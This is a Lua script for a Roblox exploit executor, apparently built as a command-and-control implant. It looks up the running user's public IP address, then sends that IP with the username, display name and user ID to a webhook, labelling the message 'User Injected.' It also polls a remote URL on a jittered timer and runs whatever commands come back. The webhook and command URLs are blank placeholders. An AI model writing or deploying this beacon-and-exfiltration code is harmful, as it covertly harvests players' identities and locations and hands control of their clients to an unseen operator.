local C2_ENVIRONMENT = {
    HttpGet = function(url)
        local success, response = pcall(function()
            return request({Url = url, Method = "GET"})
        end)
        if success and response and response.Success then
            return response.Body
        end
        return nil
    end,
    HttpPost = function(url, data)
        pcall(function()
            request({
                Url = url, Method = "POST", Body = data,
                Headers = {["Content-Type"] = "application/json"}
            })
        end)
    end,
}

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

local C2_CONFIG = {
    WEBHOOK_URL = "",
    COMMAND_SOURCE_URL = "",
    COMMAND_POLL_INTERVAL = 20,
    POLL_INTERVAL_JITTER = 5,
}

local localPlayer = Players.LocalPlayer
local CommandLibrary = {}
local C2_Core = {}

function C2_Core:GetNetworkAddress()
    local providers = {
        "https://httpbin.org/ip",
        "http://ip-api.com/json/",
        "https://api.ipify.org"
    }

    for _, url in ipairs(providers) do
        local responseBody = C2_ENVIRONMENT.HttpGet(url)
        if responseBody then
            local success, decoded = pcall(HttpService.JSONDecode, HttpService, responseBody)
            if success and decoded then
                return decoded.origin or decoded.query
            elseif not success then
                return responseBody
            end
        end
        task.wait(0.1)
    end
    
    return "Xeno Be Like"
end

function C2_Core:GetPlayerTarget(identifier: string)
    if identifier:lower() == "localplayer" then return localPlayer end
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Name:lower() == identifier:lower() or player.DisplayName:lower() == identifier:lower() then
            return player
        end
    end
    return nil
end

function CommandLibrary:SetWalkSpeed(target: Player, speed: number)
    local humanoid = target and target.Character and target.Character:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end
    humanoid.WalkSpeed = tonumber(speed) or 16
end

function C2_Core:ExecuteCommand(commandPayload)
    local commandName = commandPayload.Command
    local arguments = commandPayload.Arguments
    if not commandName or not CommandLibrary[commandName] or not arguments then return end

    local resolvedArgs = {}
    for i, arg in ipairs(arguments) do
        resolvedArgs[i] = (i == 1 and typeof(arg) == "string") and self:GetPlayerTarget(arg) or arg
    end

    if resolvedArgs[1] == nil then return end
    pcall(CommandLibrary[commandName], unpack(resolvedArgs))
end

function C2_Core:PollForCommands()
    while true do
        local randomJitter = math.random(-C2_CONFIG.POLL_INTERVAL_JITTER, C2_CONFIG.POLL_INTERVAL_JITTER)
        task.wait(C2_CONFIG.COMMAND_POLL_INTERVAL + randomJitter)

        local responseBody = C2_ENVIRONMENT.HttpGet(C2_CONFIG.COMMAND_SOURCE_URL)
        if not responseBody then continue end

        local success, decodedPayload = pcall(HttpService.JSONDecode, HttpService, responseBody)
        if not success or typeof(decodedPayload) ~= "table" then continue end

        self:ExecuteCommand(decodedPayload)
    end
end

function C2_Core:SendBeacon()
    local ipAddress = self:GetNetworkAddress()
    
    local payload = {
        username = "Player Info",
        content = "User Injected.",
        embeds = {{
            title = "Gamer",
            color = 15105570,
            fields = {
                {name = "Gamer", value = localPlayer.Name, inline = true},
                {name = "Gamer's Nickname", value = localPlayer.DisplayName, inline = true},
                {name = "UserID", value = tostring(localPlayer.UserId), inline = false},
                {name = "Woah!", value = ipAddress, inline = false},
                {name = "Timestamp (UTC)", value = os.date("!%Y-%m-%d %H:%M:%S"), inline = false}
            },
            footer = {text = "Information"}
        }}
    }
    
    local encodedPayload = HttpService:JSONEncode(payload)
    C2_ENVIRONMENT.HttpPost(C2_CONFIG.WEBHOOK_URL, encodedPayload)
end

function C2_Core:Initialize()
    task.spawn(function() self:SendBeacon() end)
    task.spawn(function() self:PollForCommands() end)
end

C2_Core:Initialize()
